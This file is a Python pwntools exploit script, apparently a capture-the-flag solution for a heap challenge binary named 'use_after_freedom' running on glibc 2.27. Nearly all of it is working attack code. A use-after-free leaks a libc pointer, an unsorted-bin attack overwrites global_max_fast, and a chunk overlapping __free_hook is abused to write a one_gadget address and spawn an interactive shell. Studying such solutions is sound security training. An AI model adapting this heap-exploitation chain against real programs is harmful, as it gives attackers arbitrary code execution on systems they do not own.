#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-v']
exe = './use_after_freedom'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

allocations = 0
main_arena = 0x3ebc40
global_max_fast = 0x3ed940
free_hook = 0x3ed8e8
one_gadget = 0x10a41c

def alloc(size, data):
    global allocations

    io.sendline('1')
    io.readuntil('> ')
    io.sendline(str(size))
    io.readuntil('> ')
    io.send(data)
    io.readuntil('> ')

    allocations += 1
    return allocations - 1

def free(num):
    io.sendline('2')
    io.readuntil('> ')
    io.sendline(str(num))
    io.readuntil('> ')

def update(num, data):
    io.sendline('3')
    io.readuntil('> ')
    io.sendline(str(num))
    io.readuntil('> ')
    io.send(data)
    io.readuntil('> ')

def view(num):
    io.sendline('4')
    io.readuntil('> ')
    io.sendline(str(num))
    data = io.readline()
    io.readuntil('> ')

    return data


def offset_to_size(offset):
    return (((offset - main_arena) * 2) - 0x10)

libc = ELF('libc-2.27.so')

io = start()

io.readuntil('> ')

# challenge uses malloc to get the address of the first chunk of the heap
# for use as the min address that can be checked against in the malloc
# wrapper. It's freed and goes into the unsorted bin since it's over 0x420.
# this will pull from the unsorted bin
a = alloc(0x500, b'A'*8)

# allocate a chunk large enough that we can free into the "fast bin" that
# will overlap with __free_hook
b = alloc(offset_to_size(free_hook), b'B'*8)

# provide our own /bin/sh string in case we can't use one_gadget
c = alloc(0x500, b'/bin/sh')

# free the first chunk and get it back into the unsorted bin, this will write
# the prev and next pointer to be the address of the unsorted bin in the main
# arena since it's the only chunk in there then we can leak it with our read
# after free.
free(a)
data = view(a).strip()
missing = 8 - len(data)
unsorted = unpack(data + (b'\x00' * missing))
log.info(f'leaked unsorted bin pointer 0x{unsorted:x}')

# get address of main_arena by using the leaked unsorted bin address
# - (12 * 8) to get to the top of the main arena
libc.address = unsorted - (12 * 8) - main_arena

log.info(f'libc base @ 0x{libc.address:x}')
log.info(f'global_max_fast @ 0x{(libc.address + global_max_fast):x}')

log.info(f'writing global_max_fast into fd pointer')
update(a, p64(0) + p64(libc.address + global_max_fast - 0x10))

# write address of unsorted bin into global_max_fast
e = alloc(0x500, b'E'*8)

# free our chunk into the fast bin that overlaps __free_hook now that
# global_max_fast has been overwritten
free(b)

log.info(f'writing address of one gadget into fd pointer of chunk overlapping __free_hook')
update(b, p64(libc.address + one_gadget) + b'E'*8)

# alloc overlapping chunk with __free_hook to write it's tampered fd pointer
# (one_gadget) into the __free_hook
alloc(offset_to_size(free_hook), b'F'*8)

log.info(f'free 2 to win!')
io.interactive()
